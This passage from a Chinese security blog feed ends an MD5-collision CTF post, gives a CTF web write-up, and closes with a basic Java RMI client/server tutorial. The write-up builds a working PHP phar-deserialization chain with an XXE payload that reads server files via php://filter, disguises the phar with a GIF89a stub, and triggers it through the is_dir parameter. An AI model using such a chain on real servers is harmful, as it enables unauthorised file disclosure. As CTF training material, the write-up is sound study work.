<p>终端输入<code>python .\MD5碰撞.py &quot;123&quot; 0</code><br><img src="/./../images/2/2-10.png" alt="image.png"><br>实践试一下：<br><img src="/./../images/2/2-11.png" alt="image.png"><br><code>注意点：跑出来的123后面第一个字符要是字母，如果不是多跑几次，概率还是挺大的。</code></p>
<p><a name="D6C2L"></a></p>
<h3 id="尾言"><a href="#尾言" class="headerlink" title="尾言"></a>尾言</h3><p>还有关于双md5的题目等等，只要掌握了这些思想，看到题目就能想到解法了。这个脚本也是面向百度编程找到的，有一个脚本能跑是比较好的，可以应对各种新情况。使用python脚本是因为有多线程模式，速度更快。</p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
  </entry>
  <entry>
    <title>长城杯Web WP</title>
    <url>/2023/03/31/2023%E9%95%BF%E5%9F%8E%E6%9D%AF%E6%80%BB%E7%BB%93/</url>
    <content><![CDATA[<h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><span id="more"></span>
<p>访问8000端口，题目给了源码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TheUse</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$obj</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$con1</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$con2</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$obj</span>,<span class="variable">$con1</span>,<span class="variable">$con2</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;obj = <span class="variable">$obj</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;con1 = <span class="variable">$con1</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;con2 = <span class="variable">$con2</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$new</span> = <span class="variable language_">$this</span>-&gt;obj;</span><br><span class="line">        <span class="variable">$new</span>(<span class="variable language_">$this</span>-&gt;con1,<span class="variable language_">$this</span>-&gt;con2);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyClass</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$dir</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$dir</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;dir = <span class="variable">$dir</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;String conversion...\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"><span class="variable">$param1</span>,<span class="variable">$param2</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="variable">$param1</span>(<span class="variable">$param2</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getdir</span>(<span class="params"><span class="variable">$path</span></span>)</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">glob</span>(<span class="variable">$path</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">load</span>(<span class="params"><span class="variable">$con</span></span>)</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">simplexml_load_string</span>(<span class="variable">$con</span>,<span class="literal">null</span>,LIBXML_NOENT);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;f&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$filename</span>=<span class="variable">$_REQUEST</span>[<span class="string">&#x27;f&#x27;</span>];</span><br><span class="line">    <span class="title function_ invoke__">is_dir</span>(<span class="variable">$filename</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>php反序列的知识不懂可以先看：<a href="https://blog.csdn.net/qq_64201116/article/details/127234204">https://blog.csdn.net/qq_64201116&#x2F;article&#x2F;details&#x2F;127234204</a><br>看到<code>**class的魔术方法**</code>第一时间想到反序列化<br>但是没有类似于<code>unserialize()</code>的反序列化函数<br>注意到函数<code>is_dir()</code>，这个函数可以触发<code>phar</code>协议，这个phar协议可以触发反序列化<br>phar反序列化知识补充：<a href="http://home.ustc.edu.cn/~xjyuan/blog/2019/11/13/phar-unserialize/">http://home.ustc.edu.cn/~xjyuan&#x2F;blog&#x2F;2019&#x2F;11&#x2F;13&#x2F;phar-unserialize&#x2F;</a><br>但是phar需要有文件上传的点：于是找到了<code>/upload.php</code>这个功能点<br>因此思路就有了：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">通过链子构造phar文件，上传phar文件后用phar协议读取</span><br></pre></td></tr></table></figure>

<p>反序列化的链子很简单：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">TheUse$__destruct() --&gt;MyClass$__invoke--&gt;MyClass$getdir()  //读取文件名称</span><br><span class="line">TheUse$__destruct() --&gt;MyClass$__invoke--&gt;MyClass$load()     //读取文件内容</span><br></pre></td></tr></table></figure>
<p>构造反序列化链子：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TheUse</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$obj</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$con1</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$con2</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$obj</span>,<span class="variable">$con1</span>,<span class="variable">$con2</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;obj = <span class="variable">$obj</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;con1 = <span class="variable">$con1</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;con2 = <span class="variable">$con2</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$new</span> = <span class="variable language_">$this</span>-&gt;obj;</span><br><span class="line">        <span class="variable">$new</span>(<span class="variable language_">$this</span>-&gt;con1,<span class="variable language_">$this</span>-&gt;con2);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyClass</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$dir</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$dir</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;dir = <span class="variable">$dir</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;String conversion...\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"><span class="variable">$param1</span>,<span class="variable">$param2</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="variable">$param1</span>(<span class="variable">$param2</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getdir</span>(<span class="params"><span class="variable">$path</span></span>)</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">glob</span>(<span class="variable">$path</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">load</span>(<span class="params"><span class="variable">$con</span></span>)</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">simplexml_load_string</span>(<span class="variable">$con</span>,<span class="literal">null</span>,LIBXML_NOENT);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$xml</span>=<span class="string">&lt;&lt;&lt;EOF</span></span><br><span class="line"><span class="string">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; </span></span><br><span class="line"><span class="string">&lt;!DOCTYPE ANY[</span></span><br><span class="line"><span class="string">&lt;!ENTITY file SYSTEM &quot;php://filter/convert.base64-encode/resource=/var/www/html/flag.php&quot;&gt;]&gt;</span></span><br><span class="line"><span class="string">&lt;x&gt;&amp;file;&lt;/x&gt;</span></span><br><span class="line"><span class="string">EOF</span>;</span><br><span class="line"><span class="variable">$payload</span> = <span class="keyword">new</span> <span class="title class_">TheUse</span>(<span class="keyword">new</span> <span class="title class_">MyClass</span>(<span class="string">&#x27;./&#x27;</span>), <span class="string">&#x27;load&#x27;</span>, <span class="variable">$xml</span>);</span><br></pre></td></tr></table></figure>
<h2 id="坑点1"><a href="#坑点1" class="headerlink" title="坑点1"></a>坑点1</h2><p>构造函数的时候<code>$xml</code>变量要用</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">$xml=&lt;&lt;<span class="tag">&lt;<span class="name">EOF</span></span></span><br><span class="line"><span class="tag">&lt;?<span class="attr">xml</span> <span class="attr">version</span>=<span class="string">&quot;1.0&quot;</span> <span class="attr">encoding</span>=<span class="string">&quot;utf-8&quot;</span>?&gt;</span> </span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">ANY</span>[</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="keyword">file</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;php://filter/convert.base64-encode/resource=./flag.php&quot;</span>&gt;</span>]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">x</span>&gt;</span><span class="symbol">&amp;file;</span><span class="tag">&lt;/<span class="name">x</span>&gt;</span></span><br><span class="line">EOF;</span><br></pre></td></tr></table></figure>
<p>这种形式定义，不能直接放到构造函数里，我就是死在这</p>
<h2 id="坑点2"><a href="#坑点2" class="headerlink" title="坑点2"></a>坑点2</h2><p>在xml中读取文件时要用绝对路径读取协议(这里用了php伪协议读取文件:  php filter读文件知识补充<a href="https://blog.csdn.net/qq_64201116/article/details/125926612">https://blog.csdn.net/qq_64201116&#x2F;article&#x2F;details&#x2F;125926612</a>)：</p>
<p>不用绝对路径的报错图：</p>
<p><img src="/../images/%E9%95%BF%E5%9F%8E%E6%9D%AFWP/1.png" alt="1.jpg"></p>
<p>解决方法(使用绝对路径)：</p>
<p><img src="/../images/%E9%95%BF%E5%9F%8E%E6%9D%AFWP/2.png" alt="2.png"></p>
<h2 id="解题："><a href="#解题：" class="headerlink" title="解题："></a>解题：</h2><p>payload生成读取文件名的phar文件：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TheUse</span></span>&#123;</span><br><span class="line">     <span class="keyword">private</span> <span class="variable">$obj</span>;</span><br><span class="line">     <span class="keyword">private</span> <span class="variable">$con1</span>;</span><br><span class="line">     <span class="keyword">private</span> <span class="variable">$con2</span>;</span><br><span class="line">     <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$obj</span>,<span class="variable">$con1</span>,<span class="variable">$con2</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;obj = <span class="variable">$obj</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;con1 = <span class="variable">$con1</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;con2 = <span class="variable">$con2</span>;</span><br><span class="line">    &#125; </span><br><span class="line">     <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">         <span class="variable">$new</span> = <span class="variable language_">$this</span>-&gt;obj;</span><br><span class="line">         <span class="variable">$new</span>(<span class="variable language_">$this</span>-&gt;con1,<span class="variable language_">$this</span>-&gt;con2);</span><br><span class="line">     &#125;</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="class"><span class="keyword">class</span> <span class="title">MyClass</span></span>&#123;</span><br><span class="line">     <span class="keyword">private</span> <span class="variable">$dir</span>;</span><br><span class="line">     <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$dir</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;dir = <span class="variable">$dir</span>;</span><br><span class="line">    &#125; </span><br><span class="line">     <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">         <span class="keyword">echo</span> <span class="string">&quot;String conversion...\n&quot;</span>;</span><br><span class="line">     &#125;</span><br><span class="line">     <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"><span class="variable">$param1</span>,<span class="variable">$param2</span></span>)</span>&#123;</span><br><span class="line">         <span class="variable language_">$this</span>-&gt;<span class="variable">$param1</span>(<span class="variable">$param2</span>);</span><br><span class="line">     &#125;</span><br><span class="line">     <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">getdir</span>(<span class="params"><span class="variable">$path</span></span>)</span>&#123;</span><br><span class="line">         <span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">glob</span>(<span class="variable">$path</span>));</span><br><span class="line">     &#125;</span><br><span class="line">     <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">load</span>(<span class="params"><span class="variable">$con</span></span>)</span>&#123;</span><br><span class="line">         <span class="title function_ invoke__">simplexml_load_string</span>(<span class="variable">$con</span>,<span class="literal">null</span>,LIBXML_NOENT);</span><br><span class="line">     &#125;</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$payload</span> = <span class="keyword">new</span> <span class="title class_">TheUse</span>(<span class="keyword">new</span> <span class="title class_">MyClass</span>(<span class="string">&#x27;/var/www/html&#x27;</span>), <span class="string">&#x27;getdir&#x27;</span>, <span class="string">&#x27;/var/www/html/*&#x27;</span>);</span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&#x27;phar.phar&#x27;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&#x27;GIF89a&#x27;</span>.<span class="string">&#x27;&lt;?php __HALT_COMPILER();?&gt;&#x27;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$payload</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&#x27;1.txt&#x27;</span>,<span class="string">&#x27;test&#x27;</span>); <span class="comment">// phar:[phar.phar][system_get_you_filename]/1.txt</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br></pre></td></tr></table></figure>
<p>运行后上传phar文件<br>然后使用phar协议读取：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?f=phar:///var/www/html/phar.phar</span><br></pre></td></tr></table></figure>

<p><img src="/../images/%E9%95%BF%E5%9F%8E%E6%9D%AFWP/3.png" alt="3.png"></p>
<p>可以看到flag的名称是<code>Maybe_flag_is_here.php</code><br>接下来读取flag：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TheUse</span></span>&#123;</span><br><span class="line">     <span class="keyword">private</span> <span class="variable">$obj</span>;</span><br><span class="line">     <span class="keyword">private</span> <span class="variable">$con1</span>;</span><br><span class="line">     <span class="keyword">private</span> <span class="variable">$con2</span>;</span><br><span class="line">     <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$obj</span>,<span class="variable">$con1</span>,<span class="variable">$con2</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;obj = <span class="variable">$obj</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;con1 = <span class="variable">$con1</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;con2 = <span class="variable">$con2</span>;</span><br><span class="line">    &#125; </span><br><span class="line">     <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">         <span class="variable">$new</span> = <span class="variable language_">$this</span>-&gt;obj;</span><br><span class="line">         <span class="variable">$new</span>(<span class="variable language_">$this</span>-&gt;con1,<span class="variable language_">$this</span>-&gt;con2);</span><br><span class="line">     &#125;</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="class"><span class="keyword">class</span> <span class="title">MyClass</span></span>&#123;</span><br><span class="line">     <span class="keyword">private</span> <span class="variable">$dir</span>;</span><br><span class="line">     <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$dir</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;dir = <span class="variable">$dir</span>;</span><br><span class="line">    &#125; </span><br><span class="line">     <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">         <span class="keyword">echo</span> <span class="string">&quot;String conversion...\n&quot;</span>;</span><br><span class="line">     &#125;</span><br><span class="line">     <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"><span class="variable">$param1</span>,<span class="variable">$param2</span></span>)</span>&#123;</span><br><span class="line">         <span class="variable language_">$this</span>-&gt;<span class="variable">$param1</span>(<span class="variable">$param2</span>);</span><br><span class="line">     &#125;</span><br><span class="line">     <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">getdir</span>(<span class="params"><span class="variable">$path</span></span>)</span>&#123;</span><br><span class="line">         <span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">glob</span>(<span class="variable">$path</span>));</span><br><span class="line">     &#125;</span><br><span class="line">     <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">load</span>(<span class="params"><span class="variable">$con</span></span>)</span>&#123;</span><br><span class="line">         <span class="title function_ invoke__">simplexml_load_string</span>(<span class="variable">$con</span>,<span class="literal">null</span>,LIBXML_NOENT);</span><br><span class="line">     &#125;</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$xml</span>=<span class="string">&lt;&lt;&lt;EOF</span></span><br><span class="line"><span class="string">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; </span></span><br><span class="line"><span class="string">&lt;!DOCTYPE ANY[</span></span><br><span class="line"><span class="string">&lt;!ENTITY file SYSTEM &quot;php://filter/convert.base64-encode/resource=/var/www/html/Maybe_flag_is_here.php&quot;&gt;]&gt;</span></span><br><span class="line"><span class="string">&lt;x&gt;&amp;file;&lt;/x&gt;</span></span><br><span class="line"><span class="string">EOF</span>;</span><br><span class="line"><span class="variable">$payload</span> = <span class="keyword">new</span> <span class="title class_">TheUse</span>(<span class="keyword">new</span> <span class="title class_">MyClass</span>(<span class="string">&#x27;/var/www/html&#x27;</span>), <span class="string">&#x27;load&#x27;</span>, <span class="variable">$xml</span>);</span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&#x27;phar.phar&#x27;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&#x27;GIF89a&#x27;</span>.<span class="string">&#x27;&lt;?php __HALT_COMPILER();?&gt;&#x27;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$payload</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&#x27;1.txt&#x27;</span>,<span class="string">&#x27;test&#x27;</span>); <span class="comment">// phar:[phar.phar][system_get_you_filename]/1.txt</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>依旧是把生成的phar文件上传,使用phar协议反序列化：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?f=phar:///var/www/html/phar.phar</span><br></pre></td></tr></table></figure>
<p><img src="/../images/%E9%95%BF%E5%9F%8E%E6%9D%AFWP/4.png" alt="image.png"></p>
<p>解码得到flag:<br><img src="/../images/%E9%95%BF%E5%9F%8E%E6%9D%AFWP/5.png" alt="image.png"></p>
<p>flag:<code>flag&#123;this-is-flag-for-you&#125;</code></p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
  </entry>
  <entry>
    <title>RMI</title>
    <url>/2023/04/02/RMI/</url>
    <content><![CDATA[<h2 id="RMI概述"><a href="#RMI概述" class="headerlink" title="RMI概述"></a>RMI概述</h2><p> RMI(Remote Method Invocation)，远程方法调用。说直白点就是可以利用机器A调用远程机器B上面的方法。但是这是依赖JVM实现的，所以也只能从一个JVM到另一个JVM去调用。<br>话不多说来个简单的代码理解：<br>我们首先敲服务端的代码：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.rmi.AlreadyBoundException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RMIServer</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> RemoteException, AlreadyBoundException &#123;</span><br><span class="line">        <span class="type">IRemoteObj</span> <span class="variable">remoteObj</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RemoteObjImpl</span>();</span><br><span class="line">        Registry registry= LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line">        registry.bind(<span class="string">&quot;remoteObj&quot;</span>, remoteObj);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p> 然后完善RemoteObjImpl类：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.UnicastRemoteObject;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RemoteObjImpl</span> <span class="keyword">extends</span> <span class="title class_">UnicastRemoteObject</span> <span class="keyword">implements</span> <span class="title class_">IRemoteObj</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">RemoteObjImpl</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">sayHello</span><span class="params">(String keywords)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">upKeywords</span> <span class="operator">=</span> keywords.toUpperCase();</span><br><span class="line">        System.out.println(upKeywords);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;copy that&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>这个就是被调用的远程方法的具体实现，要执行的代码逻辑全写在这里了，代码比较简单就不赘述了。<br>最后再添加一个服务端的IRemoteObj：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.rmi.Remote;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">IRemoteObj</span> <span class="keyword">extends</span> <span class="title class_">Remote</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">sayHello</span><span class="params">(String keywords)</span> <span class="keyword">throws</span> RemoteException;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>接着来编写客户端：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.rmi.NotBoundException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RMIClient</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> RemoteException, NotBoundException &#123;</span><br><span class="line">        <span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.getRegistry(<span class="string">&quot;127.0.0.1&quot;</span>, <span class="number">1099</span>);</span><br><span class="line">        <span class="type">IRemoteObj</span> <span class="variable">remoteObj</span> <span class="operator">=</span> (IRemoteObj) registry.lookup(<span class="string">&quot;remoteObj&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">hello</span> <span class="operator">=</span> remoteObj.sayHello(<span class="string">&quot;hello&quot;</span>);</span><br><span class="line">        System.out.println(hello);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>客户端还需编写一个接口IRemoteObj,用于说明客户端需要调用何种方法：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.rmi.Remote;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">IRemoteObj</span> <span class="keyword">extends</span> <span class="title class_">Remote</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">sayHello</span><span class="params">(String keywords)</span> <span class="keyword">throws</span> RemoteException;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>实验结果：<br>服务端：<br><img src="/./../images/RMI/1.png" alt="image.png"><br>客户端：<br><img src="/./../images/RMI/2.png" alt="image.png"></p>
<p>完成了这个简单小实验后对RMI的理解应该深了一点，我们现在来更完整地理解RMI的流程<br>首先有服务端和客户端，客户端如何调用服务端呢？服务端通过绑定远程对象，这个对象可以封装网络操作，<code>网络之间的通信就是端口之间的通信</code>，客户端只要传递需要调用的方法的名字即可。可是客户端和服务端之间的沟通端口怎么确定呢，Java为了解决这个问题，弄了一个叫做注册中心的东西，并且<code>固定端口为1099</code>。因此只要任何想要和服务端通信的机子只要来1099端口询问要调用的服务开在哪个端口即可，同理在服务端开设服务也要到注册中心注册并且会使用动态分配端口的方法来开设服务。<br>需要注意的是端口之间通信的话接口也要相同(java.rmi.Remote)，同时接口也要抛出异常，这样才能通信。</p>
<h3 id="最后说几个坑点："><a href="#最后说几个坑点：" class="headerlink" title="最后说几个坑点："></a>最后说几个坑点：</h3><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">1.最好把这个RMIClient和RMIServer分开，不然很容易写岔。</span><br><span class="line">2.分开写之后两边的包名都要相同，否则反序列化，然后报错</span><br><span class="line">3.服务端new一个RemoteObjImpl的时候是用RemoteObj这个接口去声明的</span><br></pre></td></tr></table></figure>
